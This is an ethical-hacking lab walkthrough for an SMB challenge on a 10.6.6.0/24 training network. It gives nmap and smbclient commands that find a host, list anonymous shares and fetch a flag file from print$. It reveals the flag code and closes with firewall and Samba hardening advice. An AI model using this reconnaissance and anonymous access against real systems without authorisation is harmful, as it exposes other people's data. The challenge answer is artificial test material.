Challenge 3: Exploiting Open SMB Server Shares
Overview
This document outlines the steps to complete Challenge 3 of the Cisco Ethical Hacker Capstone Project. The objective is to identify and exploit open SMB server shares on the 10.6.6.0/24 network, locate the taxes.txt file in the print$ share, extract the code A9!15wa2, and propose remediation strategies.
Prerequisites

Tools: nmap, smbclient (installed via Chocolatey on Windows or native on Linux).
Environment: Git Bash on Windows, within /e/CTF-Projects/Cisco-Ethical-Hacker-Capstone.
Network: Access to 10.6.6.0/24 for scanning.

Steps
Step 1: Scan for SMB Hosts
Objective
Identify hosts running SMB services on the 10.6.6.0/24 network.
Command
nmap -p 139,445 10.6.6.0/24

Result
Host 10.6.6.23 has port 445 open, indicating SMB services.
Screenshot
View Nmap Scan Output
Step 2: Enumerate SMB Shares
Objective
List shares on 10.6.6.23 accessible anonymously.
Command
smbclient -L //10.6.6.23 -N

Output
Sharename       Type      Comment
---------       ----      -------
homes           Disk      All home directories
workfiles       Disk      Confidential Workfiles
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (Samba 4.9.5-Debian)

Analysis

print$ and IPC$ are accessible without authentication.
homes and workfiles likely require credentials.

Screenshot
View SMB Share List
Step 3: Access and Download the File
Objective
Connect to the print$ share, locate taxes.txt, and extract the code.
Commands

Connect to print$:smbclient //10.6.6.23/print$ -N


Inside smbclient:ls
get taxes.txt
exit


Inspect locally:cat taxes.txt



Result

taxes.txt is found in print$.
Contents: A9!15wa2.

Screenshot
View SMB Client Operations
Step 4: Propose Remediation
Objective
Suggest methods to secure the SMB server.
Recommendations

Restrict Access:
Use firewall rules to limit SMB ports (139, 445) to trusted IPs.
Example:iptables -A INPUT -p tcp --dport 445 -s <trusted_ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 445 -j DROP




Enforce Strong Authentication:
In /etc/samba/smb.conf, configure:restrict anonymous = 2
guest ok = no


Enable SMB signing/encryption and use strong passwords.



Folder Structure

challenges/challenge-3-samba-exploits/
screenshots/
step1_nmap_scan.png
step2_smbclient_list_shares.png
step3_smbclient_operations.png


smb-commands.txt: Commands used.
walkthrough.md: This file.


